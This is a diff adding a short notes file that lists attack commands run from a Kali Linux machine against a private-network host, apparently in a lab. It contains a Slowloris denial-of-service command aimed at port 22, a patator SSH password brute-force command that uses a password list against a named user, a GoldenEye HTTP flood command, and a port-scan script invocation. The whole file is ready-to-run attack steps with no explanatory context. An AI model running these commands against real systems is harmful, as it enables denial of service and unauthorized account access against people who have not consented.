@@ -1,0 +1,8 @@
+1.dos slow: sudo python3 /home/kali/Desktop/Slowloris/slowloris/slowloris.py 192.168.10.10 -s 500 -p 22
+
+2. ssh bruce force: sudo patator ssh_login user=william password=FILE0 0=/home/kali/Desktop/Brute-force-SSH-service/passwords.txt host=192.168.10.10 -x ignore:fgrep='Access denied for user'
+
+3. dos golden-eye:
+    - cd /home/kali/Desktop/GoldenEye/GoldenEye
+    - sudo ./goldeneye.py http://192.168.10.10:80/ -s 10 -m random 
+4. scan port: sudo python /home/kali/Desktop/script_data/portscan_new.py
